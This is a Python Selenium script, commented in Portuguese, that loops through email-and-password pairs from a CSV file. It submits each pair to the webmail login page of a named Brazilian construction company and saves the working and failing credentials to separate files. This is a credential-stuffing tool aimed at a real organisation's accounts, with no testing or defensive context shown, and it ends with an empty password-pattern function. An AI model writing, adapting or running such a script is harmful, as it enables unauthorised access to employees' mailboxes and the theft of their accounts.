from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.action_chains import ActionChains
from webdriver_manager.chrome import ChromeDriverManager
import pandas as pd
import time
from read_csv import read_csv

# Caminho para o driver do navegador (ChromeDriver)
chrome_driver_path = "chromedriver.exe"  # Ou o caminho correto no seu sistema

# URL da plataforma de login
LOGIN_URL = "https://webmail.ecovitaconstrutora.com.br/interface/root#/login"  # Substitua pelo site real

INPUT_FILE = "emails_senhas.csv"
VALID_OUTPUT = "logins_validos.csv"
INVALID_OUTPUT = "logins_invalidos.csv"

# Configuração do Selenium
options = webdriver.ChromeOptions()
#options.add_argument("--headless")  # Executa sem abrir o navegador (remova para depuração)
service = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=service, options=options)


lista_emails_senha = read_csv()

valid_logins = []
invalid_logins = []

for email, senha in lista_emails_senha:    
    print(f"Tentando login: {email} com senha {senha}")
    try:
        driver.get(LOGIN_URL)
        time.sleep(1)  # Aguarde o carregamento da página

        # Localizar campos de entrada
        email_input = driver.find_element(By.ID, "loginUsernameBox")  
        senha_input = driver.find_element(By.ID, "loginPasswordBox")
        login_button = driver.find_element(By.XPATH, "//button[@type='submit']")  
        print("LOGIN BUTTON ", login_button)
        email_input.clear()
        senha_input.clear()


        email_input.send_keys(email)
        senha_input.send_keys(senha)
        login_button.click()
        
        time.sleep(2)  # Aguarde resposta

        if "dashboard" in driver.current_url: 
            print(f"✔ Login bem-sucedido: {email}")
            valid_logins.append((email, senha))
        else:
            print(f"❌ Login falhou: {email}")
            invalid_logins.append((email, senha))
    
    except Exception as e:
        print(f"Erro ao processar {email}: {e}")
        invalid_logins.append((email, senha))
    
    
print("logins validos: ", valid_logins)
print("logins invalidos: ", invalid_logins)

# Fechar o navegador
driver.quit()

# Salvar resultados
pd.DataFrame(valid_logins, columns=["email", "senha"]).to_csv(VALID_OUTPUT, index=False)
pd.DataFrame(invalid_logins, columns=["email", "senha"]).to_csv(INVALID_OUTPUT, index=False)




def get_password_by_pattern(pattern: str) -> str:
    pass